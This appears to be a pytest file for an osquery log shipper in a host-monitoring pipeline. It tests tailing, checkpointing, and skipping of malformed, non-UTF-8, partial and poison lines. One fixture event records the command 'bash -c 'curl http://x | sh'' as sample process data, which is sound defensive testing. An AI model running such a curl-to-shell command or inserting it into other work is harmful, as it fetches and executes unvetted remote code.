"""Unit tests for the ingestion shipper and its lifespan gate.

Covers:
- FileShipper tails a log file and ships parsed osquery events to the writer
  (rotation/offset behaviour is exercised in db-writer tests; here we prove
  the end-to-end tail → parse → write loop).
- maybe_create_shipper returns None when disabled and a shipper when enabled
  (without needing a Postgres pool).
"""

from __future__ import annotations

import asyncio
import json

import pytest

from src.ingestion import runner, shipper
from src.ingestion.runner import maybe_create_shipper
from src.ingestion.shipper import FileShipper


def _process_line(name: str = "python3", cmdline: str = "python3 -m pytest") -> str:
    return json.dumps(
        {
            "name": "processes",
            "hostIdentifier": "test-mac.local",
            "calendarTime": "Mon Mar 21 12:00:00 2026 UTC",
            "unixTime": 1774267200,
            "columns": {
                "pid": "1234",
                "name": name,
                "path": f"/opt/homebrew/bin/{name}",
                "cmdline": cmdline,
                "uid": "501",
            },
            "action": "added",
        }
    )


class FakeWriter:
    """Minimal stand-in for LogWriter — records events, never touches a DB.

    Mirrors the real contract the shipper relies on, including flush()
    (W1-B: the shipper confirms the flush before persisting its checkpoint).
    """

    def __init__(self) -> None:
        self.events: list = []
        self.flush_calls = 0

    async def write(self, event) -> None:  # noqa: D401 - mirrors LogWriter.write
        self.events.append(event)

    async def flush(self) -> None:  # mirrors LogWriter.flush (no-op on empty)
        self.flush_calls += 1


@pytest.mark.asyncio
async def test_shipper_tails_and_ships(tmp_path, monkeypatch):
    log_file = tmp_path / "osqueryd.results.log"
    log_file.write_text(_process_line("python3") + "\n")

    # Redirect the checkpoint away from ~ so the test is hermetic.
    monkeypatch.setattr(shipper, "CHECKPOINT_FILE", tmp_path / "ckpt")

    writer = FakeWriter()
    ship = FileShipper(str(log_file), writer)  # type: ignore[arg-type]
    task = asyncio.create_task(ship.run())

    # First poll (≤1s interval) reads the line already in the file.
    await asyncio.sleep(1.2)
    assert len(writer.events) == 1
    assert writer.events[0].process_name == "python3"

    # Append a second line — the shipper must pick it up on the next poll.
    with open(log_file, "a") as f:
        f.write(_process_line("bash", "bash -c 'curl http://x | sh'") + "\n")
    await asyncio.sleep(1.2)
    assert len(writer.events) == 2
    assert writer.events[1].process_name == "bash"

    ship.stop()
    task.cancel()
    try:
        await asyncio.wait_for(task, timeout=2)
    except (asyncio.CancelledError, asyncio.TimeoutError):
        pass


@pytest.mark.asyncio
async def test_shipper_skips_malformed_lines(tmp_path, monkeypatch):
    log_file = tmp_path / "osqueryd.results.log"
    log_file.write_text("not json {{{\n" + _process_line("python3") + "\n")
    monkeypatch.setattr(shipper, "CHECKPOINT_FILE", tmp_path / "ckpt")

    writer = FakeWriter()
    ship = FileShipper(str(log_file), writer)  # type: ignore[arg-type]
    task = asyncio.create_task(ship.run())
    await asyncio.sleep(1.2)

    # Malformed line is logged-and-skipped; the valid line still ships.
    assert len(writer.events) == 1
    assert writer.events[0].process_name == "python3"

    ship.stop()
    task.cancel()
    try:
        await asyncio.wait_for(task, timeout=2)
    except (asyncio.CancelledError, asyncio.TimeoutError):
        pass


@pytest.mark.asyncio
async def test_shipper_survives_non_utf8_bytes(tmp_path, monkeypatch):
    """AUD-006: one undecodable byte used to raise UnicodeDecodeError inside
    text-mode iteration; the outer handler retried from the SAME offset
    forever — an infinite error loop that stalled the pipe until manual
    intervention. Binary read + errors="replace" must advance past the
    corrupt line and ship the rest."""
    log_file = tmp_path / "osqueryd.results.log"
    good1 = _process_line("python3").encode() + b"\n"
    corrupt = b"\xff\xfe not json at all\n"  # invalid UTF-8, unparseable
    good2 = _process_line("bash", "bash -c id").encode() + b"\n"
    log_file.write_bytes(good1 + corrupt + good2)
    monkeypatch.setattr(shipper, "CHECKPOINT_FILE", tmp_path / "ckpt")

    writer = FakeWriter()
    ship = FileShipper(str(log_file), writer)  # type: ignore[arg-type]
    task = asyncio.create_task(ship.run())
    await asyncio.sleep(1.2)

    # The corrupt line no longer wedges the shipper: both good lines shipped
    # (the corrupt line fails parse and is skipped), and the checkpoint
    # advanced to end-of-file — RAW byte accounting, replacement chars
    # (3-byte U+FFFD) must not drift the offset.
    assert len(writer.events) == 2
    assert ship._offset == log_file.stat().st_size

    # A read at the end offset processes nothing new (no infinite loop).
    await ship._read_new_lines()
    assert len(writer.events) == 2

    ship.stop()
    task.cancel()
    try:
        await asyncio.wait_for(task, timeout=2)
    except (asyncio.CancelledError, asyncio.TimeoutError):
        pass


@pytest.mark.asyncio
async def test_shipper_holds_trailing_partial_line(tmp_path, monkeypatch):
    """AUD-006 companion contract: the offset advances over COMPLETE lines
    only — a trailing partial line waits for its newline (never ship half a
    JSON object; the old text-mode iteration shipped it and let parse
    failure drop it)."""
    log_file = tmp_path / "osqueryd.results.log"
    full = _process_line("python3").encode()
    log_file.write_bytes(full[:20])  # cut mid-JSON, no trailing newline

    writer = FakeWriter()
    ship = FileShipper(str(log_file), writer)  # type: ignore[arg-type]
    task = asyncio.create_task(ship.run())
    await asyncio.sleep(1.2)

    assert writer.events == []  # nothing consumable yet
    assert ship._offset == 0  # checkpoint did not advance over the partial

    # Complete the line: the whole line ships exactly once.
    log_file.write_bytes(full + b"\n")
    await asyncio.sleep(1.2)
    assert len(writer.events) == 1
    assert ship._offset == log_file.stat().st_size

    ship.stop()
    task.cancel()
    try:
        await asyncio.wait_for(task, timeout=2)
    except (asyncio.CancelledError, asyncio.TimeoutError):
        pass


def test_maybe_create_shipper_disabled_by_default(monkeypatch):
    monkeypatch.setattr(runner.settings, "enable_ingestion_shipper", False)
    assert maybe_create_shipper(FakeWriter()) is None  # type: ignore[arg-type]


def test_maybe_create_shipper_enabled(monkeypatch, tmp_path):
    monkeypatch.setattr(runner.settings, "enable_ingestion_shipper", True)
    monkeypatch.setattr(runner.settings, "osquery_log_path", str(tmp_path / "x.log"))
    monkeypatch.setattr(runner.settings, "shipper_checkpoint_path", str(tmp_path / "ckpt"))
    ship = maybe_create_shipper(FakeWriter())  # type: ignore[arg-type]
    assert ship is not None
    assert isinstance(ship, FileShipper)


def test_maybe_create_shipper_wires_settings_checkpoint_path(monkeypatch, tmp_path):
    """Regression (2026-09-04, found live in the API container): the checkpoint
    used to default to Path.home(), which does not exist for the container's
    appuser — the checkpoint never saved and every container restart re-ingested
    the whole results log (duplicate events). The runner must wire
    settings.shipper_checkpoint_path (the persistent data/ volume), not HOME."""
    monkeypatch.setattr(runner.settings, "enable_ingestion_shipper", True)
    monkeypatch.setattr(runner.settings, "osquery_log_path", str(tmp_path / "x.log"))
    ckpt = tmp_path / "shipper_checkpoint"
    monkeypatch.setattr(runner.settings, "shipper_checkpoint_path", str(ckpt))
    ship = maybe_create_shipper(FakeWriter())  # type: ignore[arg-type]
    assert ship is not None
    assert ship.checkpoint_path == ckpt


@pytest.mark.asyncio
async def test_checkpoint_persists_without_home_dir(tmp_path, monkeypatch):
    """Container reality: HOME may not exist at all. The shipper must still
    tail + checkpoint successfully when its checkpoint_path is a writable,
    persistent path (the data/ volume) — regardless of what Path.home() is."""
    # Simulate the container: home resolves to a path that does not exist.
    monkeypatch.setattr(shipper.Path, "home", staticmethod(lambda: tmp_path / "nonexistent-home"))
    log_file = tmp_path / "osqueryd.results.log"
    log_file.write_text(_process_line("python3") + "\n")
    ckpt = tmp_path / "ckpt"

    writer = FakeWriter()
    ship = FileShipper(str(log_file), writer, checkpoint_path=ckpt)  # type: ignore[arg-type]
    task = asyncio.create_task(ship.run())
    await asyncio.sleep(1.2)
    assert len(writer.events) == 1
    ship.stop()
    task.cancel()
    try:
        await asyncio.wait_for(task, timeout=2)
    except (asyncio.CancelledError, asyncio.TimeoutError):
        pass

    # The checkpoint file must now exist (saved via the atomic tmp+replace) and
    # record a non-zero offset, and reload must restore it (no re-ingest).
    assert ckpt.exists()
    assert int(ckpt.read_text().strip()) > 0
    reloaded = FileShipper(str(log_file), writer, checkpoint_path=ckpt)  # type: ignore[arg-type]
    assert reloaded._offset > 0


@pytest.mark.asyncio
async def test_shipper_poison_line_does_not_stall(tmp_path, monkeypatch):
    """W1-C belt-and-braces: the parser promises never-raise, but an exception
    escaping it used to propagate out of _read_new_lines into run()'s handler,
    which sleeps and retries from the SAME offset forever (the exact AUD-006
    wedge shape). The per-line guard must skip the poison line, ship the rest,
    and advance the checkpoint over ALL consumed bytes."""
    log_file = tmp_path / "osqueryd.results.log"
    poison = b'{"poison": true}\n'
    good1 = _process_line("python3").encode() + b"\n"
    good2 = _process_line("bash", "bash -c id").encode() + b"\n"
    log_file.write_bytes(poison + good1 + good2)
    monkeypatch.setattr(shipper, "CHECKPOINT_FILE", tmp_path / "ckpt")

    real_parse = shipper.parse_osquery_line

    def _poisonous(line: str):
        if "poison" in line:
            raise RuntimeError("poison line")
        return real_parse(line)

    monkeypatch.setattr(shipper, "parse_osquery_line", _poisonous)

    writer = FakeWriter()
    ship = FileShipper(str(log_file), writer)  # type: ignore[arg-type]

    # Direct call: on the old code the parser's exception escaped
    # _read_new_lines and the offset never advanced (the stall).
    await ship._read_new_lines()

    assert [e.process_name for e in writer.events] == ["python3", "bash"]
    assert ship._offset == log_file.stat().st_size

    # Idempotence: a second read at the advanced offset ships nothing new.
    await ship._read_new_lines()
    assert len(writer.events) == 2
